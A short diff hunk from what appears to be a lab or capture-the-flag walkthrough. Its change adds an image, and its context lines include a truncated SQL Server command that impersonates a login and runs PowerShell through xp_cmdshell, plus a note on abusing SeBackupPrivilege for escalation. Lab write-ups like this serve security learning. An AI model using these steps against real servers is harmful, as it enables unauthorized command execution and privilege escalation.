@@ -255,6 +255,7 @@ HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'powershell -c "
 
 > `svc_wtbackup` is a member of the `Backup Operators` group, with leverage `SeBackupPrivilege` 
 
+<img width="1114" height="111" alt="image" src="https://github.com/user-attachments/assets/886c6e7b-faec-4cde-9fb3-1ed697771ef2" />
 
 
 
